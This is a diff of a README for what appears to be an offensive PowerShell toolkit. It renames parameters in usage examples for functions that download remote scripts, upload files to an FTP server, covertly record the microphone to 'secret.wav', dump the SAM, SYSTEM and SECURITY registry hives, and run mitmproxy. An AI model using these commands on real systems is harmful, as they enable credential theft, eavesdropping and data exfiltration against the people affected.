@@ -18,22 +18,22 @@ DownloadScript -url "http://example.com/a.ps1"
 ### Unzip
 This function allows unzip a file in speficif folder.
 ```
-Unzip -zipfile "myzip.zip" -path "c:\windows\temp"
+Unzip -inputfile "myzip.zip" -outputfolder "c:\windows\temp"
 ```
 ### UploadFtp
 This function allows upload a file to FTP server.
 ```
-UploadFtp -address "192.168.0.1" -username "username" -password "password" -pathFileName "/folder/file.txt" -uploadfile "file.txt"
+UploadFtp -address "192.168.0.1" -username "username" -password "password" -outputfile "/folder/file.txt" -inputfile "file.txt"
 ```
 ### RunVoiceRecord
 This functions allows record from mic.
 ```
-RunVoiceRecord -fullPathOutput "C:\windows\temp\secret.wav" -seconds 120
+RunVoiceRecord -outputfile "C:\windows\temp\secret.wav" -seconds 120
 ```
 ### DumpHives
 This functio dump sam, system and security from register hives.
 ```
-DumpHives -dumpfolder "C:/windows/temp"
+DumpHives -outputfolder "C:/windows/temp"
 ```
 ### RunMitmp
 This function download, and run mitmproxy, in the 8080 port.
